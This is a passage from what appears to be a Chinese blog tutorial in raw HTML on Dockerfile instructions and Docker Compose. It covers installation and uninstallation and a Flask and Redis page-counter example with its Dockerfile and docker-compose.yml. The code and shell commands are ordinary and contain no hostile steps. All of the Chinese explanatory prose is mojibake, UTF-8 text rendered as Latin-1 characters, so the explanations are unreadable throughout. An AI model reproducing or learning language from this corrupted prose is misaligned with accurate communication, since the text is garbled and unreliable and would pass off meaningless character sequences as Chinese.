æŒ‡ä»¤ä¼šä»¤é•œåƒæ„å»ºç¼“å­˜å¤±æ•ˆï¼Œä»è€Œå¯èƒ½ä¼šä»¤é•œåƒæ„å»ºå˜å¾—æ¯”è¾ƒç¼“æ…¢ã€‚</p><p>å› æ­¤åœ¨ COPY å’Œ ADD æŒ‡ä»¤ä¸­é€‰æ‹©çš„æ—¶å€™ï¼Œå¯ä»¥éµå¾ªè¿™æ ·çš„åŸåˆ™ï¼Œæ‰€æœ‰çš„æ–‡ä»¶å¤åˆ¶å‡ä½¿ç”¨ COPY æŒ‡ä»¤ï¼Œä»…åœ¨éœ€è¦è‡ªåŠ¨è§£å‹ç¼©çš„åœºåˆä½¿ç”¨ ADDã€‚</p><p><strong>WORKDIR</strong></p><p>WORKDIR ç”¨äºé…åˆ RUNï¼ŒCMDï¼ŒENTRYPOINT å‘½ä»¤è®¾ç½®å½“å‰å·¥ä½œè·¯å¾„ã€‚å¯ä»¥è®¾ç½®å¤šæ¬¡ï¼Œå¦‚æœæ˜¯ç›¸å¯¹è·¯å¾„ï¼Œåˆ™ç›¸å¯¹å‰ä¸€ä¸ª WORKDIR å‘½ä»¤ã€‚é»˜è®¤è·¯å¾„ä¸º/ã€‚ä¸€èˆ¬æ ¼å¼ä¸º <code>WORKDIR /path/to/work/dir</code> ã€‚ä¾‹å¦‚æˆ‘ä»¬è®¾ç½®/app è·¯å¾„ï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /app</span></span><br></pre></td></tr></table></figure><p><strong>RUN</strong></p><p><code>RUN</code> ç”¨äºå®¹å™¨å†…éƒ¨æ‰§è¡Œå‘½ä»¤ã€‚æ¯ä¸ª <code>RUN</code> å‘½ä»¤ç›¸å½“äºåœ¨åŸæœ‰çš„é•œåƒåŸºç¡€ä¸Šæ·»åŠ äº†ä¸€ä¸ªæ”¹åŠ¨å±‚ï¼ŒåŸæœ‰çš„é•œåƒä¸ä¼šæœ‰å˜åŒ–ã€‚shellæ ¼å¼ä¸º <code>RUN &lt;command&gt;</code> ã€‚ä¾‹å¦‚æˆ‘ä»¬è¦å®‰è£… python ä¾èµ–åŒ…ï¼Œæˆ‘ä»¬åšæ³•å¦‚ä¸‹ï¼š</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="bash"> pip install -r requirements.txt</span></span><br></pre></td></tr></table></figure><p>exec æ ¼å¼ï¼š<code>RUN [&quot;å¯æ‰§è¡Œæ–‡ä»¶&quot;, &quot;å‚æ•°1&quot;, &quot;å‚æ•°2&quot;]</code>ï¼Œè¿™æ›´åƒæ˜¯å‡½æ•°è°ƒç”¨ä¸­çš„æ ¼å¼ã€‚</p><p>Dockerfile ä¸­æ¯ä¸€ä¸ªæŒ‡ä»¤éƒ½ä¼šå»ºç«‹ä¸€å±‚ï¼ŒRUN ä¹Ÿä¸ä¾‹å¤–ã€‚æ¯ä¸€ä¸ª RUN çš„è¡Œä¸ºï¼Œå°±å’Œåˆšæ‰æˆ‘ä»¬æ‰‹å·¥å»ºç«‹é•œåƒçš„è¿‡ç¨‹ä¸€æ ·ï¼šæ–°å»ºç«‹ä¸€å±‚ï¼Œåœ¨å…¶ä¸Šæ‰§è¡Œè¿™äº›å‘½ä»¤ï¼Œæ‰§è¡Œç»“æŸåï¼Œcommit è¿™ä¸€å±‚çš„ä¿®æ”¹ï¼Œæ„æˆæ–°çš„é•œåƒã€‚</p><p><strong>EXPOSE</strong></p><p>EXPOSE å‘½ä»¤ç”¨æ¥æŒ‡å®šå¯¹å¤–å¼€æ”¾çš„ç«¯å£ã€‚ä¸€èˆ¬æ ¼å¼ä¸º <code>EXPOSE &lt;port&gt; [&lt;port&gt;...]</code></p><p>ä¾‹å¦‚ä¸Šé¢é‚£ä¸ªä¾‹å­ï¼Œå¼€æ”¾5000ç«¯å£ï¼š</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXPOSE <span class="number">5000</span></span><br></pre></td></tr></table></figure><p><strong>ENTRYPOINT</strong></p><p>ENTRYPOINT å¯ä»¥è®©ä½ çš„å®¹å™¨è¡¨ç°å¾—åƒä¸€ä¸ªå¯æ‰§è¡Œç¨‹åºä¸€æ ·ã€‚ä¸€ä¸ª Dockerfile ä¸­åªèƒ½æœ‰ä¸€ä¸ª ENTRYPOINTï¼Œå¦‚æœæœ‰å¤šä¸ªï¼Œåˆ™æœ€åä¸€ä¸ªç”Ÿæ•ˆã€‚</p><p>ENTRYPOINT å‘½ä»¤ä¹Ÿæœ‰ä¸¤ç§æ ¼å¼ï¼š</p><ul><li>ENTRYPOINT [â€œexecutableâ€, â€œparam1â€, â€œparam2â€] ï¼šæ¨èä½¿ç”¨çš„ execå½¢å¼</li><li>ENTRYPOINT command param1 param2 ï¼šshell å½¢å¼</li></ul><p>ä¾‹å¦‚ä¸‹é¢è¿™ä¸ªï¼Œæˆ‘ä»¬è¦å°† python é•œåƒå˜æˆå¯æ‰§è¡Œçš„ç¨‹åºï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·å»åšï¼š</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> [<span class="string">"python"</span>]</span></span><br></pre></td></tr></table></figure><p><strong>CMD</strong></p><p>CMD å‘½ä»¤ç”¨äºå¯åŠ¨å®¹å™¨æ—¶é»˜è®¤æ‰§è¡Œçš„å‘½ä»¤ï¼ŒCMD å‘½ä»¤å¯ä»¥åŒ…å«å¯æ‰§è¡Œæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥ä¸åŒ…å«å¯æ‰§è¡Œæ–‡ä»¶ã€‚ä¸åŒ…å«å¯æ‰§è¡Œæ–‡ä»¶çš„æƒ…å†µä¸‹å°±è¦ç”¨ ENTRYPOINT æŒ‡å®šä¸€ä¸ªï¼Œç„¶å CMD å‘½ä»¤çš„å‚æ•°å°±ä¼šä½œä¸ºENTRYPOINTçš„å‚æ•°ã€‚</p><p>CMD å‘½ä»¤æœ‰ä¸‰ç§æ ¼å¼ï¼š</p><ul><li>CMD [â€œexecutableâ€,â€param1â€,â€param2â€]ï¼šæ¨èä½¿ç”¨çš„ exec å½¢å¼ã€‚</li><li>CMD [â€œparam1â€,â€param2â€]ï¼šæ— å¯æ‰§è¡Œç¨‹åºå½¢å¼</li><li>CMD command param1 param2ï¼šshell å½¢å¼ã€‚</li></ul><p>ä¸€ä¸ª Dockerfile ä¸­åªèƒ½æœ‰ä¸€ä¸ªCMDï¼Œå¦‚æœæœ‰å¤šä¸ªï¼Œåˆ™æœ€åä¸€ä¸ªç”Ÿæ•ˆã€‚è€Œ CMD çš„ shell å½¢å¼é»˜è®¤è°ƒç”¨ /bin/sh -c æ‰§è¡Œå‘½ä»¤ã€‚</p><p>CMD å‘½ä»¤ä¼šè¢« Docker å‘½ä»¤è¡Œä¼ å…¥çš„å‚æ•°è¦†ç›–ï¼š<code>docker run busybox /bin/echo Hello</code> Docker ä¼šæŠŠ CMD é‡Œçš„å‘½ä»¤è¦†ç›–ã€‚</p><p>ä¾‹å¦‚æˆ‘ä»¬è¦å¯åŠ¨ <code>/app</code> ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å¦‚ä¸‹å‘½ä»¤å®ç°ï¼š</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">"app.py"</span>]</span></span><br></pre></td></tr></table></figure><h2 id="Dockerä¸‰å‰‘å®¢ä¹‹Composeé¡¹ç›®"><a href="#Dockerä¸‰å‰‘å®¢ä¹‹Composeé¡¹ç›®" class="headerlink" title="Dockerä¸‰å‰‘å®¢ä¹‹Composeé¡¹ç›®"></a>Dockerä¸‰å‰‘å®¢ä¹‹Composeé¡¹ç›®</h2><h3 id="äº†è§£dockerä¸‰å‰‘å®¢"><a href="#äº†è§£dockerä¸‰å‰‘å®¢" class="headerlink" title="äº†è§£dockerä¸‰å‰‘å®¢"></a>äº†è§£dockerä¸‰å‰‘å®¢</h3><p><strong>docker-machineæ˜¯è§£å†³dockerè¿è¡Œç¯å¢ƒé—®é¢˜</strong>ã€‚</p><p>dockeræŠ€æœ¯æ˜¯åŸºäºLinuxå†…æ ¸çš„cgroupæŠ€æœ¯å®ç°çš„ï¼Œé‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œå¦‚æœåœ¨éLinuxå¹³å°ä¸Šä½¿ç”¨dockeræŠ€æœ¯éœ€è¦ä¾èµ–å®‰è£…Linuxç³»ç»Ÿçš„è™šæ‹Ÿæœºã€‚docker-machineå°±æ˜¯dockerå…¬å¸å®˜æ–¹æå‡ºçš„ï¼Œç”¨äºåœ¨å„ç§å¹³å°ä¸Šå¿«é€Ÿåˆ›å»ºå…·æœ‰dockeræœåŠ¡çš„è™šæ‹Ÿæœºçš„æŠ€æœ¯ã€‚ä½ å¯ä»¥æŠŠå®ƒç†è§£ä¸ºvirtualboxæˆ–è€…vmwareï¼Œæœ€å¼€å§‹åœ¨win7ä¸Šç”¨å¾—æ¯”è¾ƒå¤šï¼Œä½†æ˜¯win10å¼€å§‹è‡ªå¸¦äº†hyper-vè™šæ‹Ÿæœºï¼Œå·²ç»ä¸å†éœ€è¦docker-machineäº†ï¼Œdockerå¯ä»¥ç›´æ¥è¿è¡Œåœ¨å®‰è£…äº†Linuxç³»ç»Ÿå¾—hyper-vä¸Šã€‚</p><p><strong>dcoker-composeä¸»è¦æ˜¯è§£å†³æœ¬åœ°dockerå®¹å™¨ç¼–æ’é—®é¢˜ã€‚</strong></p><p>ä¸€èˆ¬æ˜¯é€šè¿‡YAMLé…ç½®æ–‡ä»¶æ¥ä½¿ç”¨å®ƒï¼Œè¿™ä¸ªYAMLæ–‡ä»¶é‡Œèƒ½è®°å½•å¤šä¸ªå®¹å™¨å¯åŠ¨çš„é…ç½®ä¿¡æ¯ï¼ˆé•œåƒã€å¯åŠ¨å‘½ä»¤ã€ç«¯å£æ˜ å°„ç­‰ï¼‰ï¼Œæœ€ååªéœ€è¦æ‰§è¡Œdocker-composeå¯¹åº”çš„å‘½ä»¤å°±ä¼šåƒæ‰§è¡Œè„šæœ¬ä¸€æ ·åœ°æ‰¹é‡åˆ›å»ºå’Œé”€æ¯å®¹å™¨ã€‚</p><p><strong>docker-swarmdocker-swarmæ˜¯è§£å†³å¤šä¸»æœºå¤šä¸ªå®¹å™¨è°ƒåº¦éƒ¨ç½²å¾—é—®é¢˜ã€‚</strong></p><p>swarmæ˜¯åŸºäºdockerå¹³å°å®ç°çš„é›†ç¾¤æŠ€æœ¯ï¼Œä»–å¯ä»¥é€šè¿‡å‡ æ¡ç®€å•çš„æŒ‡ä»¤å¿«é€Ÿçš„åˆ›å»ºä¸€ä¸ªdockeré›†ç¾¤ï¼Œæ¥ç€åœ¨é›†ç¾¤çš„å…±äº«ç½‘ç»œä¸Šéƒ¨ç½²åº”ç”¨ï¼Œæœ€ç»ˆå®ç°åˆ†å¸ƒå¼çš„æœåŠ¡ã€‚swarmæŠ€æœ¯ç›¸å½“ä¸æˆç†Ÿï¼Œå¾ˆå¤šé…ç½®åŠŸèƒ½éƒ½æ— æ³•å®ç°ï¼Œåªèƒ½è¯´æ˜¯ä¸ªåŠæˆå“ï¼Œç›®å‰æ›´å¤šçš„æ˜¯ä½¿ç”¨Kubernetesæ¥ç®¡ç†é›†ç¾¤å’Œè°ƒåº¦å®¹å™¨ã€‚</p><h3 id="dockerfileä¸docker-composeçš„åŒºåˆ«"><a href="#dockerfileä¸docker-composeçš„åŒºåˆ«" class="headerlink" title="dockerfileä¸docker-composeçš„åŒºåˆ«"></a>dockerfileä¸docker-composeçš„åŒºåˆ«</h3><p>ç®€å•æ€»ç»“ï¼š</p><ol><li>dockerfile: æ„å»ºé•œåƒï¼›</li><li>docker run: å¯åŠ¨å®¹å™¨ï¼›</li><li>docker-compose: å¯åŠ¨æœåŠ¡ï¼›</li></ol><p>ç®€è€Œè¨€ä¹‹ï¼Œ Dockerfile å¯ä»¥è®©ç”¨æˆ·ç®¡ç†ä¸€ä¸ªå•ç‹¬çš„åº”ç”¨å®¹å™¨ï¼›è€Œ Compose åˆ™å…è®¸ç”¨æˆ·åœ¨ä¸€ä¸ªå•ç‹¬çš„docker-compose.ymlæ¨¡æ¿æ–‡ä»¶ï¼ˆYAML æ ¼å¼ï¼‰ä¸­å®šä¹‰ä¸€ç»„ç›¸å…³è”çš„åº”ç”¨å®¹å™¨ï¼ˆè¢«ç§°ä¸ºä¸€ä¸ª projectï¼Œå³é¡¹ç›®ï¼‰ï¼Œä¾‹å¦‚ä¸€ä¸ª Web æœåŠ¡å®¹å™¨å†åŠ ä¸Šåç«¯çš„æ•°æ®åº“æœåŠ¡å®¹å™¨ç­‰ã€‚</p><h3 id="Docker-Compose-ä»‹ç»"><a href="#Docker-Compose-ä»‹ç»" class="headerlink" title="Docker Compose ä»‹ç»"></a>Docker Compose ä»‹ç»</h3><p>Docker-Compose æ˜¯ Docker çš„ä¸€ç§ç¼–æ’æœåŠ¡ï¼Œæ˜¯ä¸€ä¸ªç”¨äºåœ¨ Docker ä¸Šå®šä¹‰å¹¶è¿è¡Œå¤æ‚åº”ç”¨çš„å·¥å…·ï¼Œå¯ä»¥è®©ç”¨æˆ·åœ¨é›†ç¾¤ä¸­éƒ¨ç½²åˆ†å¸ƒå¼åº”ç”¨ã€‚</p><p>é€šè¿‡ Docker-Compose ç”¨æˆ·å¯ä»¥å¾ˆå®¹æ˜“åœ°ç”¨ä¸€ä¸ªé…ç½®æ–‡ä»¶å®šä¹‰ä¸€ä¸ªå¤šå®¹å™¨çš„åº”ç”¨ï¼Œç„¶åä½¿ç”¨ä¸€æ¡æŒ‡ä»¤å®‰è£…è¿™ä¸ªåº”ç”¨çš„æ‰€æœ‰ä¾èµ–ï¼Œå®Œæˆæ„å»ºã€‚Docker-Compose è§£å†³äº†å®¹å™¨ä¸å®¹å™¨ä¹‹é—´å¦‚ä½•ç®¡ç†ç¼–æ’çš„é—®é¢˜ã€‚</p><p>Docker Compose å·¥ä½œåŸç†å›¾</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566383445280.png" alt></p><p>Compose ä¸­æœ‰ä¸¤ä¸ªé‡è¦çš„æ¦‚å¿µï¼š</p><ul><li>æœåŠ¡ (service) ï¼šä¸€ä¸ªåº”ç”¨çš„å®¹å™¨ï¼Œå®é™…ä¸Šå¯ä»¥åŒ…æ‹¬è‹¥å¹²è¿è¡Œç›¸åŒé•œåƒçš„å®¹å™¨å®ä¾‹ã€‚</li><li>é¡¹ç›® (project) ï¼šç”±ä¸€ç»„å…³è”çš„åº”ç”¨å®¹å™¨ç»„æˆçš„ä¸€ä¸ªå®Œæ•´ä¸šåŠ¡å•å…ƒï¼Œåœ¨ docker-compose.yml æ–‡ä»¶ä¸­å®šä¹‰ã€‚</li></ul><p>ä¸€ä¸ªé¡¹ç›®å¯ä»¥ç”±å¤šä¸ªæœåŠ¡ï¼ˆå®¹å™¨ï¼‰å…³è”è€Œæˆï¼ŒCompose é¢å‘é¡¹ç›®è¿›è¡Œç®¡ç†ï¼Œé€šè¿‡å­å‘½ä»¤å¯¹é¡¹ç›®ä¸­çš„ä¸€ç»„å®¹å™¨è¿›è¡Œä¾¿æ·åœ°ç”Ÿå‘½å‘¨æœŸç®¡ç†ã€‚</p><p>Compose é¡¹ç›®ç”± Python ç¼–å†™ï¼Œå®ç°ä¸Šè°ƒç”¨äº† Docker æœåŠ¡æä¾›çš„ API æ¥å¯¹å®¹å™¨è¿›è¡Œç®¡ç†ã€‚å› æ­¤ï¼Œåªè¦æ‰€æ“ä½œçš„å¹³å°æ”¯æŒ Docker APIï¼Œå°±å¯ä»¥åœ¨å…¶ä¸Šåˆ©ç”¨ Compose æ¥è¿›è¡Œç¼–æ’ç®¡ç†ã€‚</p><h3 id="å®‰è£…ä¸å¸è½½"><a href="#å®‰è£…ä¸å¸è½½" class="headerlink" title="å®‰è£…ä¸å¸è½½"></a>å®‰è£…ä¸å¸è½½</h3><p><code>Compose</code> æ”¯æŒ Linuxã€macOSã€Windows 10 ä¸‰å¤§å¹³å°ã€‚</p><p><code>Compose</code> å¯ä»¥é€šè¿‡ Python çš„åŒ…ç®¡ç†å·¥å…· <code>pip</code> è¿›è¡Œå®‰è£…ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä¸‹è½½ç¼–è¯‘å¥½çš„äºŒè¿›åˆ¶æ–‡ä»¶ä½¿ç”¨ï¼Œç”šè‡³èƒ½å¤Ÿç›´æ¥åœ¨ Docker å®¹å™¨ä¸­è¿è¡Œã€‚</p><p>å‰ä¸¤ç§æ–¹å¼æ˜¯ä¼ ç»Ÿæ–¹å¼ï¼Œé€‚åˆæœ¬åœ°ç¯å¢ƒä¸‹å®‰è£…ä½¿ç”¨ï¼›æœ€åä¸€ç§æ–¹å¼åˆ™ä¸ç ´åç³»ç»Ÿç¯å¢ƒï¼Œæ›´é€‚åˆäº‘è®¡ç®—åœºæ™¯ã€‚</p><p><code>Docker for Mac</code> ã€<code>Docker for Windows</code> è‡ªå¸¦ <code>docker-compose</code> äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå®‰è£… Docker ä¹‹åå¯ä»¥ç›´æ¥ä½¿ç”¨ã€‚</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># docker-compose --version</span><br><span class="line">docker-compose version <span class="number">1.24</span><span class="number">.1</span>, build <span class="number">4667896</span>b</span><br></pre></td></tr></table></figure><p><strong>äºŒè¿›åˆ¶åŒ…</strong></p><p>åœ¨ Linux ä¸Šçš„ä¹Ÿå®‰è£…ååˆ†ç®€å•ï¼Œä» å®˜æ–¹ GitHub Release å¤„ç›´æ¥ä¸‹è½½ç¼–è¯‘å¥½çš„äºŒè¿›åˆ¶æ–‡ä»¶å³å¯ã€‚</p><p>ä¾‹å¦‚ï¼Œåœ¨ Linux 64 ä½ç³»ç»Ÿä¸Šç›´æ¥ä¸‹è½½å¯¹åº”çš„äºŒè¿›åˆ¶åŒ…ã€‚</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo curl -L <span class="symbol">https:</span>/<span class="regexp">/github.com/docker</span><span class="regexp">/compose/releases</span><span class="regexp">/download/</span><span class="number">1.17</span>.<span class="number">1</span>/docker-compose-<span class="string">`uname -s`</span>-<span class="string">`uname -m`</span> &gt; <span class="regexp">/usr/local</span><span class="regexp">/bin/docker</span>-compose</span><br><span class="line">$ sudo chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><p>é€šå¸¸ä¹Ÿå¯ä»¥é€šè¿‡apt-getåŒ…ç®¡ç†å®‰è£…docker-compose ä¸åŒçš„å‘è¡Œç‰ˆæœ¬ä¸ä¸€æ ·ï¼Œå…·ä½“è¯·å‚è€ƒå®˜æ–¹æ–‡æ¡£</p><p><strong>å¸è½½</strong></p><p>å¦‚æœæ˜¯äºŒè¿›åˆ¶åŒ…æ–¹å¼å®‰è£…çš„ï¼Œåˆ é™¤äºŒè¿›åˆ¶æ–‡ä»¶å³å¯ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo rm /usr/<span class="built_in">local</span>/bin/docker-compose</span></span><br></pre></td></tr></table></figure><p>å¦‚æœæ˜¯é€šè¿‡ pip å®‰è£…çš„ï¼Œåˆ™æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤å³å¯åˆ é™¤ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo pip uninstall docker-compose</span></span><br></pre></td></tr></table></figure><h3 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h3><p><strong>æœ¯è¯­</strong></p><p>é¦–å…ˆä»‹ç»å‡ ä¸ªæœ¯è¯­ã€‚</p><ul><li><p>æœåŠ¡ (service)ï¼šä¸€ä¸ªåº”ç”¨å®¹å™¨ï¼Œå®é™…ä¸Šå¯ä»¥è¿è¡Œå¤šä¸ªç›¸åŒé•œåƒçš„å®ä¾‹ã€‚</p></li><li><p>é¡¹ç›® (project)ï¼šç”±ä¸€ç»„å…³è”çš„åº”ç”¨å®¹å™¨ç»„æˆçš„ä¸€ä¸ªå®Œæ•´ä¸šåŠ¡å•å…ƒã€‚</p></li></ul><p>å¯è§ï¼Œä¸€ä¸ªé¡¹ç›®å¯ä»¥ç”±å¤šä¸ªæœåŠ¡ï¼ˆå®¹å™¨ï¼‰å…³è”è€Œæˆï¼ŒCompose é¢å‘é¡¹ç›®è¿›è¡Œç®¡ç†ã€‚</p><p><strong>åœºæ™¯</strong></p><p>æœ€å¸¸è§çš„é¡¹ç›®æ˜¯ web ç½‘ç«™ï¼Œè¯¥é¡¹ç›®åº”è¯¥åŒ…å« web åº”ç”¨å’Œç¼“å­˜ã€‚</p><p>ä¸‹é¢æˆ‘ä»¬ç”¨ Python æ¥å»ºç«‹ä¸€ä¸ªèƒ½å¤Ÿè®°å½•é¡µé¢è®¿é—®æ¬¡æ•°çš„ web ç½‘ç«™ã€‚</p><p><strong>web åº”ç”¨</strong></p><p>æ–°å»ºæ–‡ä»¶å¤¹ï¼Œåœ¨è¯¥ç›®å½•ä¸­ç¼–å†™ app.py æ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> redis <span class="keyword">import</span> Redis</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">redis = Redis(host=<span class="string">'redis'</span>, port=<span class="number">6379</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></span><br><span class="line">    count = redis.incr(<span class="string">'hits'</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello World! è¯¥é¡µé¢å·²è¢«è®¿é—® &#123;&#125; æ¬¡ã€‚\n'</span>.format(count)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">"0.0.0.0"</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><strong>Dockerfile</strong></p><p>ç¼–å†™ Dockerfile æ–‡ä»¶ï¼Œå†…å®¹ä¸º</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> python:<span class="number">3.6</span>-alpine</span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> . /code</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /code</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> pip install redis flask</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">"python"</span>, <span class="string">"app.py"</span>]</span></span><br></pre></td></tr></table></figure><p><strong>docker-compose.yml</strong></p><p>ç¼–å†™ docker-compose.yml æ–‡ä»¶ï¼Œè¿™ä¸ªæ˜¯ Compose ä½¿ç”¨çš„ä¸»æ¨¡æ¿æ–‡ä»¶ã€‚</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">version:</span> <span class="string">'3'</span></span><br><span class="line"><span class="symbol">services:</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">  web:</span></span><br><span class="line"><span class="symbol">    build:</span> .</span><br><span class="line"><span class="symbol">    ports:</span></span><br><span class="line">     - <span class="string">"5000:5000"</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">  redis:</span></span><br><span class="line"><span class="symbol">    image:</span> <span class="string">"redis:alpine"</span></span><br></pre></td></tr></table></figure><p><strong>è¿è¡Œ compose é¡¹ç›®</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker-compose up</span></span><br></pre></td></tr></table></figure><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566386283941.png" alt></p><p>æ­¤æ—¶è®¿é—®æœ¬åœ° 5000 ç«¯å£ï¼Œæ¯æ¬¡åˆ·æ–°é¡µé¢ï¼Œè®¡æ•°å°±ä¼šåŠ  1ã€‚</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566386351404.png" alt></p><h3 id="å‘½ä»¤è¯´æ˜"><a href="#å‘½ä»¤è¯´æ˜" class="headerlink" title="å‘½ä»¤è¯´æ˜"></a>å‘½ä»¤è¯´æ˜</h3><p><strong>å‘½ä»¤å¯¹è±¡ä¸æ ¼å¼</strong></p><p>å¯¹äº Compose æ¥è¯´ï¼Œå¤§éƒ¨åˆ†å‘½ä»¤çš„å¯¹è±¡æ—¢å¯ä»¥æ˜¯é¡¹ç›®æœ¬èº«ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šä¸ºé¡¹ç›®ä¸­çš„æœåŠ¡æˆ–è€…å®¹å™¨ã€‚å¦‚æœæ²¡æœ‰ç‰¹åˆ«çš„è¯´æ˜ï¼Œå‘½ä»¤å¯¹è±¡å°†æ˜¯é¡¹ç›®ï¼Œè¿™æ„å‘³ç€é¡¹ç›®ä¸­æ‰€æœ‰çš„æœåŠ¡éƒ½ä¼šå—åˆ°å‘½ä»¤å½±å“ã€‚</p><p>æ‰§è¡Œ <code>docker-compose [COMMAND] --help</code> æˆ–è€… <code>docker-compose help [COMMAND]</code> å¯ä»¥æŸ¥çœ‹å…·ä½“æŸä¸ªå‘½ä»¤çš„ä½¿ç”¨æ ¼å¼ã€‚</p><p>docker-compose å‘½ä»¤çš„åŸºæœ¬çš„ä½¿ç”¨æ ¼å¼æ˜¯</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose <span class="comment">[-f=&lt;arg&gt;...]</span> <span class="comment">[options]</span> <span class="comment">[COMMAND]</span> <span class="comment">[ARGS...]</span></span><br></pre></td></tr></table></figure><p><strong>å‘½ä»¤é€‰é¡¹</strong></p><ul><li><p><code>-f, --file FILE</code> æŒ‡å®šä½¿ç”¨çš„ Compose æ¨¡æ¿æ–‡ä»¶ï¼Œé»˜è®¤ä¸º docker-compose.ymlï¼Œå¯ä»¥å¤šæ¬¡æŒ‡å®šã€‚</p></li><li><p><code>-p, --project-name NAME</code> æŒ‡å®šé¡¹ç›®åç§°ï¼Œé»˜è®¤å°†ä½¿ç”¨æ‰€åœ¨ç›®å½•åç§°ä½œä¸ºé¡¹ç›®åã€‚</p></li><li><p><code>--x-networking</code> ä½¿ç”¨ Docker çš„å¯æ‹”æ’ç½‘ç»œåç«¯ç‰¹æ€§</p></li><li><p><code>--x-network-driver DRIVER</code> æŒ‡å®šç½‘ç»œåç«¯çš„é©±åŠ¨ï¼Œé»˜è®¤ä¸º bridge</p></li><li><p><code>--verbose</code> è¾“å‡ºæ›´å¤šè°ƒè¯•ä¿¡æ¯ã€‚</p></li><li><p><code>-v, --version</code> æ‰“å°ç‰ˆæœ¬å¹¶é€€å‡ºã€‚</p></li></ul><p><strong>å‘½ä»¤ä½¿ç”¨è¯´æ˜</strong></p><p><code>build</code><br>æ ¼å¼ä¸º <code>docker-compose build [options] [SERVICE...]ã€‚</code></p><p>æ„å»ºï¼ˆé‡æ–°æ„å»ºï¼‰é¡¹ç›®ä¸­çš„æœåŠ¡å®¹å™¨ã€‚</p><p>æœåŠ¡å®¹å™¨ä¸€æ—¦æ„å»ºåï¼Œå°†ä¼šå¸¦ä¸Šä¸€ä¸ªæ ‡è®°åï¼Œä¾‹å¦‚å¯¹äº web é¡¹ç›®ä¸­çš„ä¸€ä¸ª db å®¹å™¨ï¼Œå¯èƒ½æ˜¯ web_dbã€‚</p><p>å¯ä»¥éšæ—¶åœ¨é¡¹ç›®ç›®å½•ä¸‹è¿è¡Œ docker-compose build æ¥é‡æ–°æ„å»ºæœåŠ¡ã€‚</p><p>é€‰é¡¹åŒ…æ‹¬ï¼š</p><p>é€‰é¡¹åŒ…æ‹¬ï¼š</p><ul><li><p>â€“force-rm åˆ 